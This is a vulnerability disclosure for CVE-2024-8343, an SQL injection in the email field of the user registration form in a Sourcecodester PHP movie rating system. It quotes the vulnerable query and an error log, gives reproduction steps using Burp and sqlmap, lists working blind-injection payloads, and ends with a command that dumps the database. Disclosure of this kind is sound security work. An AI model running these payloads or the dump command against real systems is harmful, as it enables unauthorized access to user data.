# SQL Injection vulnerability was discovered in Sourcecodester's Sentiment Based Movie Success Rating Prediction System  (user registration)

Official Website: https://www.sourcecodester.com/php/15104/sentiment-based-movie-rating-system-using-phpoop-free-source-code.html

Version: 1.0
Related Code file: /msrps/classes/Users.php

---
## CVE-2024-8343
```
$chk = $this->conn->query("SELECT * FROM `client_list` where email ='{$email}' ".($id>0? " and id!= '{$id}' " : ""))->num_rows;
```
The email variable is directly inserted into the SQL query without any escaping or parameterization. An attacker could inject malicious SQL code by manipulating the email field. in (line number 135 of Users.php)

Injection parameter: email


Backend Verification for SQLi
---
```
127.0.0.1:46134 [500]: POST /msrps/classes/Users.php?f=save_client - Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'vunerableparam@mail.com'' at line 1 in /home/kali/Downloads/msrps/classes/Users.php:135                                                                                                                     
Stack trace:                                                                                                                                                
#0 /home/kali/Downloads/msrps/classes/Users.php(135): mysqli->query()                                                                                       
#1 /home/kali/Downloads/msrps/classes/Users.php(261): Users->save_client()                                                                                  
#2 {main}                                                                                                                                                   
  thrown in /home/kali/Downloads/msrps/classes/Users.php on line 135   
  ```
---
Step to Reproduce:
---

1. Go to login page and click on [Create a New Account]

![registeration](https://github.com/gurudattch/CVEs/blob/main/assets/4.png)

---

3. Fill the form and intercept the POST request in burp

![burp-image](https://github.com/gurudattch/CVEs/blob/main/assets/5.png)

---

4. Copy the **POST** request to notepad and save it.

![notepad](https://github.com/gurudattch/CVEs/blob/main/assets/6.png)

---

6. Now Run **sqlmap** on this request 

`sqlmap -r register_req.txt -p email`

```
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 433 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=&firstname=fname&middlename=midname&lastname=lnmae&gender=Male&email=mytest@mail.com' AND 4940=4940 AND 'oqjL'='oqjL&password=password

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=&firstname=fname&middlename=midname&lastname=lnmae&gender=Male&email=mytest@mail.com' AND (SELECT 7178 FROM (SELECT(SLEEP(5)))MFQU) AND 'aOrZ'='aOrZ&password=password
---

```


__dump database;__

`sqlmap -r register_req.txt -p email --dump`


